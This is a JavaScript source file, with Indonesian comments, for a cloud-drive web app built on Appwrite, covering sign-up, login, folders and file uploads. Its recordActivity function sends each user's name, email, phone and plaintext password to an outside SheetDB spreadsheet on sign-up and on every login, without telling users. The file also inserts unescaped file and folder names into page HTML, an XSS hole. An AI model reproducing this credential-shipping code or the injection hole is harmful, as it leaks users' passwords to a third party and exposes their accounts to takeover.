const client = new Appwrite.Client();
const account = new Appwrite.Account(client);
const databases = new Appwrite.Databases(client);
const storage = new Appwrite.Storage(client);

// ======================================================
// 1. KONFIGURASI
// ======================================================
const CONFIG = {
    ENDPOINT: 'https://sgp.cloud.appwrite.io/v1',
    PROJECT_ID: '697f71b40034438bb559', 
    DB_ID: 'storagedb',
    COLLECTION_FILES: 'files',   
    COLLECTION_USERS: 'users',
    BUCKET_ID: 'taskfiles'
};

// Pastikan API SheetDB ini benar
const SHEETDB_API = 'https://sheetdb.io/api/v1/v9e5uhfox3nbi';

client.setEndpoint(CONFIG.ENDPOINT).setProject(CONFIG.PROJECT_ID);

// STATE VARIABLES
let currentUser = null;
let currentFolderId = 'root'; 
let currentFolderName = "Drive";
let currentViewMode = 'root'; 
let selectedItem = null; 
let selectedUploadFile = null; 

const el = (id) => document.getElementById(id);
const showLoading = () => el('loading').classList.remove('hidden');
const hideLoading = () => el('loading').classList.add('hidden');

// ======================================================
// 2. FUNGSI PENCATAT EXCEL (SINKRON DENGAN GAMBAR ANDA)
// ======================================================
async function recordActivity(sheetName, userData) {
    try {
        console.log(`[EXCEL] Mengirim data ke sheet: ${sheetName}...`);

        // Format Waktu: 07/02/2026, 13.33.02
        const now = new Date();
        const formattedDate = now.toLocaleString('id-ID', { 
            day: '2-digit', month: '2-digit', year: 'numeric',
            hour: '2-digit', minute: '2-digit', second: '2-digit'
        }).replace(/\./g, ':'); 

        // PAYLOAD (KUNCI UTAMA PERBAIKAN)
        // Kunci di sebelah kiri (Nama, Email, dll) HARUS SAMA PERSIS dengan Header Excel Anda
        const payload = {
            "ID": userData.id || "-",
            "Nama": userData.name || "-",
            "Email": userData.email || "-",
            "Phone": userData.phone || "-",       
            "Password": userData.password || "-", 
            "Waktu": formattedDate,
            // Cadangan jika kolom Anda bernama Riwayat Waktu (dikirim dua-duanya biar aman)
            "Riwayat Waktu": formattedDate 
        };

        // Kirim ke SheetDB
        await fetch(`${SHEETDB_API}?sheet=${sheetName}`, {
            method: 'POST',
            headers: {
                'Accept': 'application/json',
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ data: payload })
        });

        console.log("Data Excel Terkirim:", payload);

    } catch (error) {
        console.error("Gagal kirim ke Excel:", error);
    }
}

// ======================================================
// 3. INISIALISASI
// ======================================================
document.addEventListener('DOMContentLoaded', () => {
    checkSession();
    initNewButtonLogic();
    initDragAndDrop();
    initLogout();
});

// Helper Toggle Password
window.togglePass = (id, icon) => {
    const input = document.getElementById(id);
    if (input.type === "password") {
        input.type = "text";
        icon.classList.remove("fa-eye-slash");
        icon.classList.add("fa-eye");
    } else {
        input.type = "password";
        icon.classList.remove("fa-eye");
        icon.classList.add("fa-eye-slash");
    }
};

// ======================================================
// 4. AUTH SYSTEM (SIGN UP, LOGIN, LOGOUT) - FULL DATA
// ======================================================

// --- SIGN UP ---
if(el('signupForm')) {
    el('signupForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const name = el('regName').value; 
        const email = el('regEmail').value; 
        const phone = el('regPhone').value; 
        const pass = el('regPass').value;
        const verify = el('regVerify').value;

        if (pass !== verify) return alert("Password tidak sama!");
        
        showLoading();
        try {
            // 1. Buat Akun Auth
            const auth = await account.create(Appwrite.ID.unique(), email, pass, name);
            
            // 2. Simpan Data User Lengkap ke Database (Penting untuk Phone)
            await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, auth.$id, { 
                name: name, 
                email: email,
                phone: phone 
            });
            
            // 3. Kirim ke Excel (Tab: SignUp)
            await recordActivity('SignUp', {
                id: auth.$id,
                name: name,
                email: email,
                phone: phone,
                password: pass
            });

            alert("Sign Up Berhasil!"); 
            window.nav('loginPage');
        } catch(e) { alert(e.message); } 
        finally { hideLoading(); }
    });
}

// --- LOGIN ---
if(el('loginForm')) {
    el('loginForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        let inputId = el('loginEmail').value.trim();
        const pass = el('loginPass').value;
        
        showLoading();
        try {
            // Cari Email jika login pakai Username
            if (!inputId.includes('@')) {
                const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, [Appwrite.Query.equal('name', inputId)]);
                if (res.total === 0) throw new Error("User tidak ditemukan");
                inputId = res.documents[0].email;
            }

            // Login
            try { await account.get(); } catch (err) { await account.createEmailPasswordSession(inputId, pass); }
            
            // AMBIL DATA PHONE DARI DATABASE (Agar Excel Lengkap)
            const userAuth = await account.get();
            let userPhone = "-";
            
            try {
                const userDB = await databases.getDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, userAuth.$id);
                userPhone = userDB.phone || "-";
            } catch(dbErr) { console.log("Phone tidak ditemukan di DB"); }

            // Kirim ke Excel (Tab: Login)
            await recordActivity('Login', {
                id: userAuth.$id,
                name: userAuth.name,
                email: userAuth.email,
                phone: userPhone,
                password: pass 
            });

            checkSession();
        } catch (error) { 
            if(error.message.includes('session is active')) {
                checkSession(); // Jika sudah login, langsung masuk
            } else {
                alert(error.message); hideLoading(); 
            }
        }
    });
}

// --- LOGOUT ---
function initLogout() {
    const btn = document.getElementById('logoutBtn');
    if (btn) {
        const newBtn = btn.cloneNode(true);
        btn.parentNode.replaceChild(newBtn, btn);

        newBtn.addEventListener('click', async (e) => {
            e.preventDefault();
            if (confirm("Yakin ingin keluar?")) {
                showLoading();
                try {
                    if (currentUser) {
                        // Ambil phone sebelum logout
                        let userPhone = "-";
                        try {
                            const userDB = await databases.getDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, currentUser.$id);
                            userPhone = userDB.phone || "-";
                        } catch(err){}

                        // Kirim ke Excel (Tab: Logout)
                        await recordActivity('Logout', {
                            id: currentUser.$id,
                            name: currentUser.name,
                            email: currentUser.email,
                            phone: userPhone,
                            password: "-" 
                        });
                    }
                    await account.deleteSession('current');
                    window.location.reload(); 
                } catch (error) { window.location.reload(); } 
                finally { hideLoading(); }
            }
        });
    }
}

// ======================================================
// 5. NAVIGASI, FOLDER & TOMBOL KEMBALI (FIXED)
// ======================================================
async function checkSession() {
    showLoading();
    try {
        currentUser = await account.get();
        window.nav('dashboardPage'); 
        loadFiles('root');  
        calculateStorage();
    } catch (e) { window.nav('loginPage'); } 
    finally { setTimeout(hideLoading, 500); }
}

window.nav = (p) => { ['loginPage', 'signupPage', 'dashboardPage'].forEach(id => el(id).classList.add('hidden')); el(p).classList.remove('hidden'); };

window.handleMenuClick = (element, mode) => {
    document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active')); element.classList.add('active');
    currentViewMode = mode; currentFolderId = 'root'; 
    currentFolderName = (mode === 'root') ? 'Drive' : element.innerText.trim();
    loadFiles(mode);
};

// FUNGSI LOAD FILES DENGAN HEADER DINAMIS
async function loadFiles(param) {
    if (!currentUser) return;
    const grid = el('fileGrid'); 
    grid.innerHTML = ''; 
    
    // Perbarui Header (Termasuk Tombol Kembali)
    updateHeaderUI();

    let queries = [Appwrite.Query.equal('owner', currentUser.$id)];
    
    if (param === 'recent') queries.push(Appwrite.Query.orderDesc('$createdAt'), Appwrite.Query.limit(20), Appwrite.Query.equal('trashed', false));
    else if (param === 'starred') queries.push(Appwrite.Query.equal('starred', true), Appwrite.Query.equal('trashed', false));
    else if (param === 'trash') queries.push(Appwrite.Query.equal('trashed', true));
    else {
        if (typeof param === 'string' && !['root','recent','starred','trash'].includes(param)) {
            currentFolderId = param;
        }
        queries.push(Appwrite.Query.equal('parentId', currentFolderId), Appwrite.Query.equal('trashed', false));
    }
    
    // Panggil lagi updateHeaderUI setelah folderId ditetapkan
    updateHeaderUI();

    try {
        const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, queries);
        if (res.documents.length === 0) {
            grid.innerHTML = `<div style="grid-column:1/-1;display:flex;flex-direction:column;align-items:center;opacity:0.5;margin-top:50px;"><i class="fa-solid fa-folder-open" style="font-size:4rem;margin-bottom:20px;"></i><p>Folder Kosong</p></div>`;
        } else {
            res.documents.forEach(doc => renderItem(doc));
        }
    } catch (e) { console.error(e); }
}

// --- LOGIKA TOMBOL KEMBALI DI SINI ---
function updateHeaderUI() {
    const container = document.querySelector('.breadcrumb-area');
    const isRoot = currentFolderId === 'root' && currentViewMode === 'root';
    
    if (isRoot) {
        const h = new Date().getHours(); 
        const s = h < 12 ? "Morning" : h < 18 ? "Afternoon" : "Night";
        container.innerHTML = `<h2 id="headerTitle">Welcome In Drive ${s}</h2>`;
    } else {
        // Tampilkan Tombol Kembali jika BUKAN di Root
        container.innerHTML = `
            <div class="back-nav-container">
                <button onclick="goBack()" class="back-btn">
                    <i class="fa-solid fa-arrow-left"></i> Kembali ke Drive
                </button>
                <h2 id="headerTitle">${currentFolderName}</h2>
            </div>
        `;
    }
}

// Fungsi Aksi Tombol Kembali
window.goBack = () => {
    currentFolderId = 'root';
    currentFolderName = "Drive";
    currentViewMode = 'root';
    
    // Kembalikan Highlight Sidebar ke Beranda
    document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
    document.querySelectorAll('.nav-item')[0].classList.add('active');
    
    loadFiles('root');
};

function openFolder(id, name) { 
    currentFolderId = id; 
    currentFolderName = name; 
    loadFiles(id); 
}

// ======================================================
// 6. RENDER ITEM & CONTEXT MENU
// ======================================================
function renderItem(doc) {
    const grid = el('fileGrid'); const div = document.createElement('div'); div.className = 'item-card';
    const isFolder = doc.type === 'folder';
    const starHTML = doc.starred ? `<i class="fa-solid fa-star" style="position:absolute;top:12px;left:12px;color:#ffd700;"></i>` : '';
    let content = isFolder ? `<i class="icon fa-solid fa-folder"></i>` : `<i class="icon fa-solid fa-file-lines" style="color:#60a5fa"></i>`;
    if (!isFolder && doc.name.match(/\.(jpg|jpeg|png|webp)$/i)) content = `<div class="thumb-box" style="width:100px;height:100px;overflow:hidden;border-radius:15px;margin-bottom:10px;"><img src="${storage.getFilePreview(CONFIG.BUCKET_ID, doc.fileId)}" style="width:100%;height:100%;object-fit:cover;"></div>`;
    
    div.innerHTML = `${starHTML}${content}<div class="item-name">${doc.name}</div>`;
    div.onclick = () => { if(!doc.trashed) isFolder ? openFolder(doc.$id, doc.name) : window.open(doc.url, '_blank'); };
    
    div.oncontextmenu = (e) => { 
        e.preventDefault(); selectedItem = doc; const menu = el('contextMenu'); 
        menu.style.top = `${e.clientY}px`; menu.style.left = `${e.clientX}px`; menu.classList.remove('hidden'); 
        if(el('starText')) el('starText').innerText = doc.starred ? "Hapus Bintang" : "Bintangi"; 
        const isTrash = doc.trashed; el('trashBtn').classList.toggle('hidden', isTrash); 
        el('restoreBtn').classList.toggle('hidden', !isTrash); el('permDeleteBtn').classList.toggle('hidden', !isTrash); 
        document.addEventListener('click', () => menu.classList.add('hidden'), {once:true}); 
    };
    grid.appendChild(div);
}

// ======================================================
// 7. DRAG & DROP & UPLOAD (MODERN)
// ======================================================
function initDragAndDrop() {
    const zone = el('dropZone'); const input = el('fileInputHidden');
    if (!zone) return;
    ['dragenter', 'dragover', 'dragleave', 'drop'].forEach(evt => zone.addEventListener(evt, (e) => { e.preventDefault(); e.stopPropagation(); }));
    zone.addEventListener('dragover', () => zone.classList.add('active'));
    zone.addEventListener('dragleave', () => zone.classList.remove('active'));
    zone.addEventListener('drop', (e) => {
        zone.classList.remove('active');
        if (e.dataTransfer.files.length > 0) handleFileSelect(e.dataTransfer.files[0]);
    });
    if (input) input.addEventListener('change', (e) => { if (e.target.files.length > 0) handleFileSelect(e.target.files[0]); });
}

function handleFileSelect(file) {
    selectedUploadFile = file;
    const infoText = el('fileInfoText'); const infoContainer = el('fileInfoContainer');
    if (infoText && infoContainer) {
        let sizeFormatted = (file.size < 1024 * 1024) ? (file.size / 1024).toFixed(1) + ' KB' : (file.size / (1024 * 1024)).toFixed(2) + ' MB';
        infoText.innerText = `${file.name} (${sizeFormatted})`;
        infoContainer.classList.remove('hidden');
    }
}

function resetUploadUI() {
    selectedUploadFile = null;
    if(el('fileInfoContainer')) el('fileInfoContainer').classList.add('hidden');
    if(el('fileInputHidden')) el('fileInputHidden').value = '';
}

// ======================================================
// 8. LOGIKA TOMBOL NEW & HELPER LAIN
// ======================================================
function initNewButtonLogic() {
    const btn = el('newBtnMain'); const menu = el('dropdownMenu');
    if (btn && menu) {
        const newBtn = btn.cloneNode(true); btn.parentNode.replaceChild(newBtn, btn);
        newBtn.addEventListener('click', (e) => { e.stopPropagation(); menu.classList.toggle('show'); });
        window.addEventListener('click', (e) => { if (!newBtn.contains(e.target) && !menu.contains(e.target)) menu.classList.remove('show'); });
    }
}

window.submitUploadFile = async () => {
    if (!selectedUploadFile) return alert("Pilih file dulu!");
    closeModal('uploadModal'); showLoading();
    try {
        const up = await storage.createFile(CONFIG.BUCKET_ID, Appwrite.ID.unique(), selectedUploadFile);
        const url = storage.getFileView(CONFIG.BUCKET_ID, up.$id);
        await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, Appwrite.ID.unique(), {
            name: selectedUploadFile.name, type: 'file', parentId: currentFolderId, owner: currentUser.$id, url: url.href, fileId: up.$id, size: selectedUploadFile.size, starred: false, trashed: false
        });
        resetUploadUI(); loadFiles(currentFolderId); calculateStorage();
    } catch (e) { alert(e.message); } finally { hideLoading(); }
};

window.submitCreateFolder = async () => {
    const name = el('newFolderName').value.trim();
    if (!name) return;
    closeModal('folderModal'); showLoading();
    try {
        await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, Appwrite.ID.unique(), {
            name: name, type: 'folder', parentId: currentFolderId, owner: currentUser.$id, size: 0, starred: false, trashed: false
        });
        loadFiles(currentFolderId); el('newFolderName').value = '';
    } catch (e) { alert(e.message); } finally { hideLoading(); }
};

async function calculateStorage() {
    if (!currentUser) return;
    try {
        const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, [Appwrite.Query.equal('owner', currentUser.$id), Appwrite.Query.equal('type', 'file')]);
        let total = 0; res.documents.forEach(d => total += (d.size || 0));
        const mb = (total / 1048576).toFixed(2);
        el('storageUsed').innerText = `${mb} MB`; el('storageBar').style.width = `${Math.min((mb / 2048) * 100, 100)}%`;
    } catch (e) {}
}

window.openModal = (id) => { el('dropdownMenu').classList.remove('show'); el(id).classList.remove('hidden'); if(id==='folderModal') setTimeout(()=>el('newFolderName').focus(),100); };
window.closeModal = (id) => el(id).classList.add('hidden');
window.triggerUploadModal = () => { resetUploadUI(); window.openModal('uploadModal'); };
window.createFolder = () => window.openModal('folderModal');
window.toggleStarItem = async () => { try { await databases.updateDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, selectedItem.$id, { starred: !selectedItem.starred }); loadFiles(currentViewMode==='root'?currentFolderId:currentViewMode); } catch(e){alert(e.message);} };
window.moveItemToTrash = async () => { try { await databases.updateDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, selectedItem.$id, { trashed: true }); loadFiles('root'); } catch(e){alert(e.message);} };
window.restoreFromTrash = async () => { try { await databases.updateDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, selectedItem.$id, { trashed: false }); loadFiles('trash'); } catch(e){alert(e.message);} };
window.deleteItemPermanently = async () => { if(!confirm("Hapus permanen?")) return; try { if(selectedItem.type==='file') await storage.deleteFile(CONFIG.BUCKET_ID, selectedItem.fileId); await databases.deleteDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, selectedItem.$id); loadFiles('trash'); calculateStorage(); } catch(e){alert(e.message);} };